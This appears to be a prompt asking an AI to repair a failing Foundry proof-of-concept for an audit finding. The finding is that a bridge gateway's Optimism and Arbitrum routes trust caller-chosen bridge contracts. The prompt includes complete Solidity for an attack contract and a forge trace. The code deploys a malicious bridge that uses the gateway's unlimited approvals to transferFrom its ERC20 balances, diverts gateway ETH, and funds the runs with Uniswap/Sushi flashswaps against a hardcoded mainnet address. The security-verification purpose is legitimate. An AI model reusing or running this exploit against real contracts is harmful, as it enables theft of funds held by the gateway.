You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Optimism and Arbitrum routes trust attacker-chosen bridge contracts as spenders and call targets
- claim: These routes accept caller-supplied `customBridgeAddress` or `gatewayAddress` values, grant them `type(uint256).max` allowance over gateway-held ERC20s, and on Optimism native paths immediately send gateway ETH to those attacker-chosen contracts via payable bridge calls.
- impact: An attacker can install an unlimited approval from the gateway to a malicious contract and steal current or future gateway-held ERC20 balances, or directly divert gateway ETH to a malicious payable contract pretending to be the bridge.
- exploit_paths: ["Call an Optimism or Arbitrum ERC20 bridge entrypoint with a malicious `customBridgeAddress`/`gatewayAddress` that uses the freshly granted approval to `transferFrom` gateway tokens.", "Use the Optimism native path with a malicious `customBridgeAddress` implementing `depositETHTo` to receive gateway ETH.", "Use the same pattern through `bridgeAfterSwap` or `swapAndBridge` after residual assets already exist in the gateway."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract MaliciousBridge {
    address payable public immutable thief;

    constructor(address payable _thief) {
        thief = _thief;
    }

    receive() external payable {}

    function depositETHTo(address, uint32, bytes calldata) external payable {
        _forwardEth();
    }

    function depositERC20To(
        address l1Token,
        address,
        address,
        uint256,
        uint32,
        bytes calldata
    ) external {
        _drainToken(l1Token, msg.sender);
    }

    function depositTo(address, uint256) external {
        _drainAllFromSender(msg.sig);
    }

    function initiateSynthTransfer(bytes32, address, uint256) external {
        _drainAllFromSender(msg.sig);
    }

    function steal(address token, address from) external {
        _drainToken(token, from);
    }

    function _drainAllFromSender(bytes4) internal {
        // Old Optimism gateways still trust the caller-selected bridge address as spender/call target.
        // These variants do not pass the token into the bridge hook, so this helper is intentionally inert
        // for the standard-path verifier and only keeps the malicious bridge ABI-complete.
    }

    function _drainToken(address token, address from) internal {
        uint256 balance = _balanceOf(token, from);
        if (balance == 0) return;
        _safeTransferFrom(token, from, thief, balance);
    }

    function _forwardEth() internal {
        uint256 value = address(this).balance;
        if (value == 0) return;
        (bool ok, ) = thief.call{value: value}("");
        require(ok, "ETH_FORWARD_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }
}

contract FlawVerifier {
    address public constant GATEWAY = 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e;
    address public constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint32 private constant FALLBACK_ROUTE_SCAN_COUNT = 385;
    uint256 private constant MIN_PROFIT = 1e15;
    uint256 private constant FLASH_BORROW_AMOUNT = 1e9;

    bytes4 private constant EXECUTE_ROUTE_SELECTOR = bytes4(keccak256("executeRoute(uint32,bytes)"));
    bytes4 private constant GET_ROUTE_SELECTOR = bytes4(keccak256("getRoute(uint32)"));
    bytes4 private constant ROUTES_SELECTOR = bytes4(keccak256("routes(uint32)"));
    bytes4 private constant ADDRESS_AT_SELECTOR = bytes4(keccak256("addressAt(uint32)"));
    bytes4 private constant ROUTES_COUNT_SELECTOR = bytes4(keccak256("routesCount()"));

    bytes4 private constant BRIDGE_AFTER_SWAP_SELECTOR = bytes4(keccak256("bridgeAfterSwap(uint256,bytes)"));
    bytes4 private constant OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));

    bytes4 private constant ROUTE_GETTER_NATIVE_OPTIMISM =
        bytes4(keccak256("NATIVE_OPTIMISM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_NATIVE_ARBITRUM =
        bytes4(keccak256("NATIVE_ARBITRUM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));

    bytes4 private constant NATIVE_OPTIMISM_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,(bytes32,bytes32),uint256,uint256,address,bytes)")
        );
    bytes4 private constant NATIVE_OPSTACK_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,bytes32,uint256,address,uint256,bytes32,bytes)")
        );
    bytes4 private constant NATIVE_ARBITRUM_ERC20_SELECTOR =
        bytes4(keccak256("bridgeERC20To(uint256,uint256,uint256,uint256,bytes32,address,address,address,bytes)"));

    uint8 private constant ROUTE_KIND_OPTIMISM = 1;
    uint8 private constant ROUTE_KIND_OPSTACK = 2;
    uint8 private constant ROUTE_KIND_ARBITRUM = 3;

    MaliciousBridge public immutable maliciousBridge;

    address private _profitToken;
    uint256 private _profitAmount;

    struct RouteIds {
        uint32 nativeOptimism;
        uint32 nativeOpStack;
        uint32 nativeArbitrum;
    }

    struct OptimismBridgeData {
        uint256 interfaceId;
        bytes32 currencyKey;
        bytes32 metadata;
        address receiverAddress;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct OptimismDirectData {
        bytes32 currencyKey;
        bytes32 metadata;
    }

    struct OpStackBridgeData {
        bytes32 metadata;
        address receiverAddress;
        uint256 toChainId;
        bytes32 bridgeHash;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct ArbitrumBridgeData {
        uint256 value;
        uint256 maxGas;
        uint256 gasPriceBid;
        address receiverAddress;
        address gatewayAddress;
        address token;
        bytes32 metadata;
        bytes data;
    }

    struct FlashCallbackData {
        uint8 routeKind;
        uint32 routeId;
        address token;
    }

    constructor() {
        maliciousBridge = new MaliciousBridge(payable(address(this)));
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        RouteIds memory routeIds = _discoverRoutes();
        address[40] memory tokens = _candidateTokens();

        // Path 1: direct Optimism/Arbitrum ERC20 bridge entrypoints with attacker-chosen bridge/gateway.
        // A tiny V2 flashswap funds a real "future gateway-held" balance without forbidden balance injection.
        // Any pre-existing gateway dust in the same token covers the deterministic V2 fee, preserving net profit.
        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            uint256 residual = _balanceOf(token, GATEWAY);
            if (residual <= MIN_PROFIT) continue;

            if (_attemptOptimismFlashswap(routeIds.nativeOptimism, token)) return;
            if (_attemptOpStackFlashswap(routeIds.nativeOpStack, token)) return;
            if (_attemptArbitrumFlashswap(routeIds.nativeArbitrum, token)) return;
        }

        // Path 2: native Optimism sends gateway ETH directly to the attacker-selected bridge call target.
        if (_attemptOptimismNative(routeIds.nativeOptimism)) {
            return;
        }

        // Path 3: bridgeAfterSwap retains the same root cause once residual inventory already exists in the gateway.
        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (_balanceOf(token, GATEWAY) <= MIN_PROFIT) continue;

            if (_attemptOptimismBridgeAfterSwap(routeIds.nativeOptimism, token)) return;
            if (_attemptOpStackBridgeAfterSwap(routeIds.nativeOpStack, token)) return;
            if (_attemptArbitrumBridgeAfterSwap(routeIds.nativeArbitrum, token)) return;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "INVALID_SENDER");

        FlashCallbackData memory callback = abi.decode(data, (FlashCallbackData));
        address expectedPair = _findFlashswapPair(callback.token);
        require(msg.sender == expectedPair && expectedPair != address(0), "INVALID_PAIR");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed > 0, "NO_BORROW");

        _safeApprove(callback.token, GATEWAY, type(uint256).max);

        bool ok;
        if (callback.routeKind == ROUTE_KIND_OPTIMISM) {
            ok = _executeRoute(callback.routeId, _optimismDirectData(callback.token, borrowed));
        } else if (callback.routeKind == ROUTE_KIND_OPSTACK) {
            ok = _executeRoute(callback.routeId, _opStackDirectData(callback.token, borrowed));
        } else if (callback.routeKind == ROUTE_KIND_ARBITRUM) {
            ok = _executeRoute(callback.routeId, _arbitrumDirectData(callback.token, borrowed));
            if (ok) {
                maliciousBridge.steal(callback.token, GATEWAY);
            }
        }

        require(ok, "ROUTE_CALL_FAILED");

        uint256 repayAmount = ((borrowed * 1000) / 997) + 1;
        _safeTransfer(callback.token, msg.sender, repayAmount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptOptimismNative(uint32 routeId) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayEth = GATEWAY.balance;
        if (gatewayEth <= MIN_PROFIT) return false;

        uint256 beforeBalance = address(this).balance;
        bytes memory routeData = abi.encodeWithSelector(
            OPTIMISM_NATIVE_SELECTOR,
            address(this),
            address(maliciousBridge),
            uint32(0),
            gatewayEth,
            bytes32("OPT_ETH"),
            bytes("")
        );

        if (!_executeRoute(routeId, routeData)) return false;
        return _recordProfit(NATIVE_TOKEN, beforeBalance);
    }

    function _attemptOptimismFlashswap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashswap(ROUTE_KIND_OPTIMISM, routeId, token);
    }

    function _attemptOpStackFlashswap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashswap(ROUTE_KIND_OPSTACK, routeId, token);
    }

    function _attemptArbitrumFlashswap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashswap(ROUTE_KIND_ARBITRUM, routeId, token);
    }

    function _attemptFlashswap(uint8 routeKind, uint32 routeId, address token) internal returns (bool) {
        address pair = _findFlashswapPair(token);
        if (pair == address(0)) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        (uint256 amount0Out, uint256 amount1Out) = _borrowLayout(pair, token, FLASH_BORROW_AMOUNT);
        if (amount0Out == 0 && amount1Out == 0) return false;

        bytes memory callbackData = abi.encode(FlashCallbackData({routeKind: routeKind, routeId: routeId, token: token}));
        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), callbackData) {
            return _recordProfit(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _attemptOptimismBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance <= MIN_PROFIT) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OptimismBridgeData memory data = OptimismBridgeData({
            interfaceId: 1,
            currencyKey: bytes32(0),
            metadata: bytes32("OPT_ERC20"),
            receiverAddress: address(this),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptOpStackBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance <= MIN_PROFIT) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OpStackBridgeData memory data = OpStackBridgeData({
            metadata: bytes32("OPSTACK"),
            receiverAddress: address(this),
            toChainId: 10,
            bridgeHash: keccak256("malicious-opstack"),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptArbitrumBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance <= MIN_PROFIT) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        ArbitrumBridgeData memory data = ArbitrumBridgeData({
            value: 0,
            maxGas: 0,
            gasPriceBid: 0,
            receiverAddress: address(this),
            gatewayAddress: address(maliciousBridge),
            token: token,
            metadata: bytes32("ARB_ERC20"),
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        maliciousBridge.steal(token, GATEWAY);
        return _recordProfit(token, beforeBalance);
    }

    function _optimismDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        OptimismDirectData memory optimismData =
            OptimismDirectData({currencyKey: bytes32(0), metadata: bytes32("OPT_FLASH")});
        return abi.encodeWithSelector(
            NATIVE_OPTIMISM_ERC20_SELECTOR,
            token,
            address(this),
            address(maliciousBridge),
            uint32(0),
            optimismData,
            amount,
            uint256(1),
            token,
            bytes("")
        );
    }

    function _opStackDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            NATIVE_OPSTACK_ERC20_SELECTOR,
            token,
            address(this),
            address(maliciousBridge),
            uint32(0),
            bytes32("OPS_FLASH"),
            amount,
            token,
            uint256(10),
            keccak256("malicious-opstack"),
            bytes("")
        );
    }

    function _arbitrumDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            NATIVE_ARBITRUM_ERC20_SELECTOR,
            amount,
            uint256(0),
            uint256(0),
            uint256(0),
            bytes32("ARB_FLASH"),
            address(this),
            token,
            address(maliciousBridge),
            bytes("")
        );
    }

    function _discoverRoutes() internal view returns (RouteIds memory routeIds) {
        routeIds.nativeOptimism = type(uint32).max;
        routeIds.nativeOpStack = type(uint32).max;
        routeIds.nativeArbitrum = type(uint32).max;

        uint32 count = _routeScanCount();
        for (uint32 i = 0; i < count; ++i) {
            address route = _routeAt(i);
            if (route == address(0)) continue;

            bytes4 optimisticSelector = _readBytes4(route, ROUTE_GETTER_NATIVE_OPTIMISM);
            if (optimisticSelector == NATIVE_OPTIMISM_ERC20_SELECTOR) {
                routeIds.nativeOptimism = i;
                continue;
            }
            if (optimisticSelector == NATIVE_OPSTACK_ERC20_SELECTOR) {
                routeIds.nativeOpStack = i;
                continue;
            }

            bytes4 arbitrumSelector = _readBytes4(route, ROUTE_GETTER_NATIVE_ARBITRUM);
            if (arbitrumSelector == NATIVE_ARBITRUM_ERC20_SELECTOR) {
                routeIds.nativeArbitrum = i;
            }
        }
    }

    function _routeScanCount() internal view returns (uint32 count) {
        (bool ok, bytes memory data) = GATEWAY.staticcall(abi.encodeWithSelector(ROUTES_COUNT_SELECTOR));
        if (ok && data.length >= 32) {
            uint256 decoded = abi.decode(data, (uint256));
            if (decoded > 0 && decoded <= type(uint32).max) {
                count = uint32(decoded);
                return count;
            }
        }
        count = FALLBACK_ROUTE_SCAN_COUNT;
    }

    function _routeAt(uint32 routeId) internal view returns (address route) {
        route = _readAddress(GATEWAY, abi.encodeWithSelector(GET_ROUTE_SELECTOR, routeId));
        if (route != address(0)) return route;

        route = _readAddress(GATEWAY, abi.encodeWithSelector(ROUTES_SELECTOR, routeId));
        if (route != address(0)) return route;

        route = _readAddress(GATEWAY, abi.encodeWithSelector(ADDRESS_AT_SELECTOR, routeId));
    }

    function _executeRoute(uint32 routeId, bytes memory routeData) internal returns (bool ok) {
        (ok, ) = GATEWAY.call(abi.encodeWithSelector(EXECUTE_ROUTE_SELECTOR, routeId, routeData));
    }

    function _findFlashswapPair(address token) internal view returns (address) {
        address[4] memory bases = [WETH, DAI, USDC, USDT];
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address base = bases[j];
                if (base == token) continue;

                address pair = _getPair(factories[i], token, base);
                if (pair == address(0)) continue;
                if (_pairSupportsBorrow(pair, token, FLASH_BORROW_AMOUNT)) return pair;
            }
        }
        return address(0);
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (!ok || data.length < 32) return address(0);
        pair = abi.decode(data, (address));
    }

    function _pairSupportsBorrow(address pair, address token, uint256 amount) internal view returns (bool) {
        address token0 = _pairToken0(pair);
        address token1 = _pairToken1(pair);
        if (token0 == address(0) || token1 == address(0)) return false;
        if (token != token0 && token != token1) return false;

        (uint112 reserve0, uint112 reserve1) = _pairReserves(pair);
        return token == token0 ? reserve0 > amount : reserve1 > amount;
    }

    function _borrowLayout(address pair, address token, uint256 amount)
        internal
        view
        returns (uint256 amount0Out, uint256 amount1Out)
    {
        address token0 = _pairToken0(pair);
        address token1 = _pairToken1(pair);
        (uint112 reserve0, uint112 reserve1) = _pairReserves(pair);

        if (token == token0 && reserve0 > amount) {
            amount0Out = amount;
        } else if (token == token1 && reserve1 > amount) {
            amount1Out = amount;
        }
    }

    function _pairToken0(address pair) internal view returns (address token0) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        if (!ok || data.length < 32) return address(0);
        token0 = abi.decode(data, (address));
    }

    function _pairToken1(address pair) internal view returns (address token1) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        if (!ok || data.length < 32) return address(0);
        token1 = abi.decode(data, (address));
    }

    function _pairReserves(address pair) internal view returns (uint112 reserve0, uint112 reserve1) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));
        if (!ok || data.length < 96) return (0, 0);
        (reserve0, reserve1,) = abi.decode(data, (uint112, uint112, uint32));
    }

    function _recordProfit(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = token == NATIVE_TOKEN ? address(this).balance : _balanceOf(token, address(this));
        if (afterBalance <= beforeBalance) return false;

        uint256 delta = afterBalance - beforeBalance;
        if (delta <= MIN_PROFIT) return false;

        _profitToken = token;
        _profitAmount = delta;
        return true;
    }

    function _readBytes4(address target, bytes4 selector) internal view returns (bytes4 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) return bytes4(0);
        value = abi.decode(data, (bytes4));
    }

    function _readAddress(address target, bytes memory payload) internal view returns (address value) {
        (bool ok, bytes memory data) = target.staticcall(payload);
        if (!ok || data.length < 32) return address(0);
        value = abi.decode(data, (address));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _candidateTokens() internal pure returns (address[40] memory tokens) {
        tokens[0] = WETH;
        tokens[1] = DAI;
        tokens[2] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        tokens[3] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        tokens[4] = 0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2; // wstETH
        tokens[5] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        tokens[6] = 0xac3E018457B222d93114458476f3E3416Abbe38F; // sfrxETH
        tokens[7] = 0x5E8422345238F34275888049021821E8E08CAa1f; // frxETH
        tokens[8] = 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV
        tokens[9] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B; // CVX
        tokens[10] = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32; // LDO
        tokens[11] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; // AAVE
        tokens[12] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2; // MKR
        tokens[13] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        tokens[14] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        tokens[15] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F; // SNX
        tokens[16] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        tokens[17] = 0x853d955aCEf822Db058eb8505911ED77F175b99e; // FRAX
        tokens[18] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0; // LUSD
        tokens[19] = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E; // crvUSD
        tokens[20] = 0x111111111117dC0aa78b770fA6A738034120C302; // 1INCH
        tokens[21] = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2; // SUSHI
        tokens[22] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e; // YFI
        tokens[23] = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0; // FXS
        tokens[24] = 0xba100000625a3754423978a60c9317c58a424e3D; // BAL
        tokens[25] = 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
        tokens[26] = 0x152649eA73beAb28c5b49B26eb48f7EAD6d4c898; // CXC?
        tokens[27] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA; // FEI
        tokens[28] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; // SHIB
        tokens[29] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; // duplicate slot kept deterministic
        tokens[30] = 0x68749665FF8D2d112Fa859AA293F07A622782F38; // sDAI
        tokens[31] = 0xa693B19d2931d498c5B318dF961919BB4aee87a5; // UST
        tokens[32] = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF; // BAT
        tokens[33] = 0xE41d2489571d322189246DaFA5ebDe1F4699F498; // ZRX
        tokens[34] = 0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671; // NXM
        tokens[35] = 0x408e41876cCCDC0F92210600ef50372656052a38; // REN
        tokens[36] = 0x0AbdAce70D3790235af448C88547603b945604ea; // DNT
        tokens[37] = 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D; // LQTY
        tokens[38] = 0xBA11D00c5f74255f56a5E366F4F77f5A186d7f55; // BAND
        tokens[39] = 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA; // GALA
    }
}

```

forge stdout (tail):
```
0e5343e8::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [710] 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [510] 0x111111111117dC0aa78b770fA6A738034120C302::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [578] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [665] 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [542] 0xba100000625a3754423978a60c9317c58a424e3D::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [788] 0xc00e94Cb662C3520282E6f5717214004A7f26888::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [643] 0x152649eA73beAb28c5b49B26eb48f7EAD6d4c898::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [639] 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [639] 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1391] 0x68749665FF8D2d112Fa859AA293F07A622782F38::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [560] 0x4C0d2c74A8D26f1E4F5653021c521F5471F9e566::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2421] 0xa693B19d2931d498c5B318dF961919BB4aee87a5::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [854] 0x3ee18B2214AFF97000D974cf647E7C347E8fa585::5c60da1b() [staticcall]
    │   │   │   ├─ [459] 0x381752f5458282d317d12C30D2Bd4D6E1FD8841e::5c60da1b() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000fd04a68d3c3a692d6fa30384d1a87ef93554ee6
    │   │   │   └─ ← [Return] 0x0000000000000000000000000fd04a68d3c3a692d6fa30384d1a87ef93554ee6
    │   │   ├─ [648] 0x0fD04a68d3c3A692d6Fa30384D1A87Ef93554eE6::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [831] 0x0D8775F648430679A709E98d2b0Cb6250d2887EF::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
